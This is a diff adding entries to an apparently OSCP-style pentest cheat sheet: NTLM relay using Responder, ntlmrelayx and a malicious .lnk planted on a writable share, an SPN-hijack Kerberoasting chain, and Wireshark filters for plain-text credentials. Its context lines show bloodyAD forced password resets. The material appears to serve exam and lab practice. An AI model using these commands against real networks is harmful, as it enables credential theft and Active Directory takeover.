@@ -163,6 +163,13 @@ Try null sessions and guest accounts first.
   smbclient //10.10.10.10/[SHARE] -N
   ```
 
+- **NTLM Capture & Relay (Responder + ntlmrelayx)**:
+  - *Scenario*: SMB signing is NOT REQUIRED on targets. Trigger connection via LNK/Relay.
+  - 1. Setup Relay Target: `impacket-ntlmrelayx -t smb://[TARGET_IP] -smb2support`
+  - 2. Setup Responder (Disable SMB/HTTP): `sudo responder -I tun0 -dwv` (Ensure `SMB = Off` in `Responder.conf`)
+  - 3. Trigger Connection: Upload a malicious `.lnk` file to a writable share.
+  - *LNK Generation*: `python3 ntlm_theft.py -g lnk -s [KALI_IP] -f trigger`
+
 - **LDAP Enumeration (oscp.exam)**:
   ```bash
   ldapsearch -H ldap://[DC_IP] -x -D "user@domain.local" -w "password" -b "dc=domain,dc=local" "(objectClass=group)" sAMAccountName
@@ -251,6 +258,12 @@ Use this for interacting with AD objects from Kali without requiring a full Wind
   ```bash
   bloodyAD -u 'user' -p 'pass' -d 'ocean.com' --host 100.130.140.169 set password 'target_user' 'NewPassword123!'
   ```
+
+- **GenericWrite to SPN Hijack (Kerberoasting)**:
+  - *Scenario*: You have `GenericWrite` over a user but cannot reset their password.
+  - 1. Set SPN for Target: `bloodyAD -u [USER] -p [PASS] -d [DOMAIN] --host [DC_IP] set object [TARGET_USER] servicePrincipalName -v 'http/target.domain.local'`
+  - 2. Kerberoast: `impacket-GetUserSPNs [DOMAIN]/[USER]:[PASS] -dc-ip [DC_IP] -request`
+  - 3. Crack & Pwn: Use John/Hashcat to find the plain-text password.
 - **Force Change Password (Poseidon)**:
   ```bash
   bloodyAD -u 'Mona' -p 'Monapass' -d 'sub.marine.com' --host 100.130.140.200 set password 'Jackie' 'PwnedJackie123!'
@@ -1632,6 +1645,11 @@ Comprehensive list of one-liners with their URL-encoded versions for immediate u
 ### 11.3. OS Forensics
 - **Bash History**: `cat /home/*/.bash_history`
 - **Vim Info**: `cat ~/.viminfo | grep -A 5 "Search String History"`
+
+- **Network Traffic Analysis (Wireshark/PCAP)**:
+  - *Filter HTTP POST Credentials*: `http.request.method == "POST"`
+  - *Filter FTP Connections*: `tcp.port == 21`
+  - *Follow Stream*: Right-click request -> Follow -> HTTP Stream (Check for plain-text `username=` and `password=`)
 
 ---
 
